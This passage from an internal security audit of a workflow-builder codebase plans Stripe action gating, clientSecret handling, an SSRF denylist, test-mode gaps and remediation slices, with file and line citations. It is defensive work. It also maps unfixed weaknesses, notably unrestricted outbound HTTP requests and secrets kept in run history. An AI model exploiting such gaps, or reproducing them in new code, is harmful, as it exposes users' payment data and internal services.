| **SEC-10** | `error.displayMessage` split | — | Engine writes both `error.message` (verbatim, for debugging) and `error.displayMessage` (humanized). All UI / notification channels consume `displayMessage` only. |
| **SEC-11** | Stripe amount unit alignment | — | Normalize all Stripe handlers to accept dollars at the schema layer; handler converts. Closes the cents/dollars asymmetry between create/capture. |
| **SEC-14** | Stripe livemode enforcement | SEC-2 | Stripe integration table gains a `livemode: boolean` column. Test-mode workflows require a test-mode integration; live-mode workflows require live; cross-execution refused. |
| **SEC-12** | OAuth callback error sanitization | — | Allowlist OAuth error codes; map everything else to `callback_failed`. |
| **SEC-13** | CSRF posture check | — | Confirm SameSite policy + add explicit Origin check on state-changing routes if not Strict. |

---

## 9. Stripe-Specific Implications

The Notion / Slack metadata batch can proceed without blocking on this audit. **Stripe is different because of money and customer PII.** The audit's recommendation:

- **Ship Stripe read-only actions** (`findCustomer`, `findPaymentIntent`, `findSubscription`, `getPayments`) once SEC-7 lands and their `email` / `last4` outputs are marked `sensitive: true`. Read-only actions are safe in test-mode because they have no side effects.
- **Hold Stripe writes** (`createPaymentIntent`, `confirmPaymentIntent`, `capturePaymentIntent`, `createRefund`, `cancelSubscription`, `createInvoice`, `createSubscription`, `createCheckoutSession`, `createCustomer`, `createPaymentLink`) until SEC-2 + SEC-4 + SEC-8 + SEC-14 land.
- **Hold metadata coverage** for high-risk writes until the meta can declare `isDestructive: true` + `requiresConfirmation: true` (SEC-4) and outputs can declare `sensitive: true` (SEC-7).
- **Webhook receiver is OK.** Strict signature verification + direct-lookup pattern. No multi-secret fallback. No additional Stripe-side webhook work required for security.
- **Idempotency is OK.** Refund / payment-intent / subscription / invoice creates all set `Idempotency-Key` derived from `runId+nodeId+actionType`. Engine retries won't double-charge.
- **Amount handling is correct for creates** but inconsistent across the family (F-M2). Worth fixing for ergonomics, not strictly a security risk.

### Stripe `client_secret` — specific decision needed

The current code returns `clientSecret` and the meta documents it as "safe to send to the client per Stripe's documented flow." That's true in a browser-rendered React component using Stripe.js. It's NOT true in a workflow engine where the value lands in run history, the variable picker, and can be wired into arbitrary downstream sinks. Audit recommendation: **drop `clientSecret` from the output entirely**; users who need a PaymentIntent for a client-side flow should call Stripe directly from their frontend (Stripe's intended pattern). If we MUST expose it (e.g., a workflow that sends the secret in an email to a customer for completion), that's a different action (`stripe:emailPaymentLink`) where the data flow is auditable.

---

## 10. Explicit No-Go Criteria Before Exposing High-Risk Stripe Actions

Each criterion is a gate. ALL must be met before any Stripe write action is added to the discovery registry / variable picker:

1. **SEC-2 shipped:** Engine has a `testMode` field on `RunWorkflowInput` and `ActionHandlerInput`. The engine pre-call gate refuses to invoke a handler when `testMode && action.isDestructive`. Verified by integration test.
2. **SEC-4 shipped:** Every Stripe write action declares `isDestructive: true` in its meta. Stripe refunds, captures, subscription cancels additionally declare `requiresConfirmation: true`.
3. **SEC-7 shipped:** Stripe outputs that contain sensitive fields (`clientSecret`, `email`, `card.*`, `customer`, `payment_method.*`) are marked `sensitive: true`. Run-details API redacts. Variable picker warns.
4. **SEC-8 resolved:** `clientSecret` either dropped from output or marked sensitive and never echoed in webhook callbacks / channel notifications.
5. **SEC-3 shipped:** `http_request` has at minimum an SSRF / private-IP denylist. Production-grade allowlist optional, denylist required.
6. **SEC-14 shipped:** Stripe integration row has `livemode` flag. Test-mode workflows refuse to execute against live integrations and vice versa. Verified by integration test.
7. **A separate runbook exists** for "user reports an accidental Stripe action" — describes how to identify the run from `workflow_runs.is_test` + `triggered_by`, retrieve the affected resource, and contact the user. Lives at `docs/runbooks/stripe-accidental-action.md` (does not exist today).
8. **UI confirmation step shipped:** Before a workflow containing an `isDestructive: true` action can be activated OR Run-now-invoked, the builder displays a typed-confirmation dialog ("Type REFUND to confirm").

If any criterion is not met, Stripe write actions stay out of `COVERED_PROVIDERS` and are not registered in `services/discovery/_registry.ts`. The handler code can continue to exist for testing; only metadata exposure is gated.

---

## 11. Appendix — Per-Area File Citations

For reviewers who want to trace specific findings.

### Workflow config storage
- Schema: `supabase/migrations/20260506000000_workflows.sql` (workflows + workflow_revisions tables, lines 28-46, 58-66, 80-98)
- Save route: `app/api/workflows/[id]/route.ts:57-86`
- Read-back: `app/api/workflows/_shared.ts:108-112`
- Contract: `contracts/workflowDefinition.ts:40` (open config record)
- HTTP request auth fields: `integrations/native/actions/httpRequest.schema.ts:57,64,71`
- Token encryption (for contrast): `core/encryption/tokens.ts`, `repositories/integrations.ts:145`

### Variable picker
- Picker UI: `features/workflow-builder/config-modal/fields/VariablePickerPopover.tsx`
- Latest-run preview source: `core/workflows/latestRunValues.ts:60-90`, `features/workflow-builder/hooks/useUpstreamVariables.ts:171-176`
- OutputMeta contract: `contracts/actionMeta.ts:257-282`

### Cross-node passing + FileRef
- Variable resolver: `workflow-engine/variables/resolveValue.ts` (strict at engine, soft at design-time; no type enforcement; `stringifyForMixed` at line 371-373)
- FileRef contract: `contracts/file.ts` (signed_url, provider_url, v2_storage arms)
- OneDrive download URL: `integrations/microsoft-onedrive/actions/getFile.ts:47`
- HTTP request unrestricted: `integrations/native/actions/httpRequest.schema.ts:80-83`, `httpRequest.ts:24` (SSRF deferred)

### Run output storage
- Schema: `supabase/migrations/20260507000001_workflow_runs.sql:21-64`
- Engine writes: `services/execution/engine.ts:343-358`
- API exposes: `app/api/workflows/[id]/runs/[runId]/route.ts:24-39`, `app/api/workflows/_shared.ts:130-144`
- Builder displays: `features/workflow-builder/panels/RunResultsPanel.tsx:25`

### Logs + notifications
- Engine logs: `services/execution/engine.ts:107-115, 254-258, 345-349`
- Humanizer: `core/errors/humanizeActionError.ts`
- In-app channel: `services/notifications/channels/inApp.ts:27-42`
- Payload builder: `services/notifications/buildWorkflowFailurePayload.ts:17-26`
- Slack API error sanitization: `integrations/slack/api/errors.ts:11-18`
- Token decrypt: `core/encryption/tokens.ts:64-82`
- OAuth callback: `app/api/integrations/oauth/[provider]/callback/route.ts:33-39, 55-59`

### RLS + auth
- Service-role helper: `repositories/supabase/serviceRoleClient.ts:16-38`
- Structure test: `tests/structure/no-service-role-imports.test.ts`
- Workflow RLS: `supabase/migrations/20260506000000_workflows.sql:80-98`
- Runs RLS: `supabase/migrations/20260507000001_workflow_runs.sql:59-64`
- Integrations RLS: `supabase/migrations/20260505000002_integrations.sql:43-55`
- Cron auth: `services/cron/auth.ts:40-66`
- Options route: `app/api/options/[source]/route.ts:99-194`
- Migration lint: `scripts/check-migration-rls.mjs:45-76`

### Stripe
- Handlers: `integrations/stripe/actions/*.ts`
- Webhook receiver: per audit, signature-verified, raw body preserved
- `clientSecret` emissions: `createPaymentIntent.ts:62`, `createPaymentIntent.meta.ts:93`, `confirmPaymentIntent.ts:43`, `confirmPaymentIntent.meta.ts:99`
- Amount conversion: `integrations/stripe/utils.ts` (`dollarsToCents`)
- Capture cents asymmetry: `capturePaymentIntent.schema.ts` (JSDoc warning)

### Test-mode
- `services/execution/engine.ts` — no testMode references (verified by absence)
- `services/execution/handlers/types.ts:38` — `ActionHandlerInput` has no testMode field
- `app/api/workflows/[id]/run-now/route.ts` — the closest to a "preview" but uses real handlers
- `supabase/migrations/20260507000001_workflow_runs.sql` — no `is_test` / `mode` column

---

## 12. Out of Scope (for this audit)

- Runtime fixes for any finding. Each fix ships as a follow-up slice in §8.
- Penetration testing. This is a code-level audit.
- Provider TOS review. We have access to provider APIs that allow these actions; this audit does not address whether automating them is allowed by each provider's TOS.
- Third-party security review. Recommend one before public Stripe launch.
- GDPR / SOC2 / PCI compliance posture. Out of scope; relevant to Stripe go-live as a separate workstream.
- Backup encryption + key rotation. Operational concern, not in code.
- The Notion / Slack metadata coverage arc currently in flight (per `docs/slices/phase-3/notion-action-metadata-plan.md` and `slack-action-metadata-plan.md`). Those continue uninterrupted.

---

## 13. Open Decisions for Marcus

| Decision | Recommended default | Why |
| --- | --- | --- |
| Sequence: SEC-2 first or SEC-7 first? | **SEC-2 first.** | Test-mode is the gate. SEC-7 is a contract addition. Without test-mode, sensitive-flag work doesn't change the underlying risk. |
| `OutputMeta.sensitive` — one flag or category enum? | **One boolean.** | No current consumer differentiates PII vs secret behaviorally. A boolean ships immediately and refines later if UX warrants. |
| `client_secret` — drop or mark sensitive? | **Drop from output.** | Stripe's intended use of `client_secret` is browser-side; surfacing it as a workflow output creates risk with no current valid use case. If a use case emerges, ship a dedicated `stripe:sendPaymentLinkEmail` action. |
| Config secret handling — encrypt fields vs vault references? | **Vault references.** | Matches V1's eventual learning (Zapier-style "Connections" model). Encrypted fields require key rotation, expose decrypted values in handlers, and don't solve "user accidentally pasted a token into a description field." Vault references centralize secrets, make rotation explicit, and audit-trail every use. |
| Retention default — 30 / 90 / 180 days? | **90 days default, workspace-configurable.** | Matches industry baseline; gives debugging window without indefinite PII accumulation. |
| `http_request` egress — allowlist or denylist? | **Denylist first (private IPs, metadata services); allowlist later.** | Allowlist is the eventual right answer but breaks existing workflows. Denylist closes the SSRF attack surface immediately. |
| Confirmation UX for destructive actions — typed-confirmation modal or two-click? | **Typed-confirmation modal.** | The cost of mis-firing a Stripe refund is high. Typed confirmation matches the AWS / GCP destructive-action pattern and reads as a deliberate slowdown, not a paper cut. |
| Should this audit recommend any fixes ship inside Slice 3.SEC-1? | **No.** | The user explicitly scoped this as audit-only. Each fix gets its own slice with its own test plan + reviewer attention. |

---

## 14. Acceptance Criteria for This Slice

This is an audit. The only "ships" is this document.

- ✅ `docs/slices/security/workflow-builder-data-security-audit.md` created.
- ✅ Executive summary present and accurate.
- ✅ Risk table with severity ranking present.
- ✅ Findings cited to specific files + line numbers.
- ✅ "What's safe today" enumerated so future slices don't regress.
- ✅ "What's unknown" enumerated honestly.
- ✅ Recommended contract changes proposed with minimal diffs.
- ✅ Recommended implementation slices listed in dependency order.
- ✅ Stripe-specific implications called out.
- ✅ Explicit no-go criteria for high-risk Stripe actions documented.
- ✅ Open decisions surfaced for Marcus.
- ✅ Run gates passing (typecheck / lint / lint:structure / lint:migrations / test).
- ✅ Local commit; no push.
- ✅ No runtime, handler, or contract changes shipped in this slice.
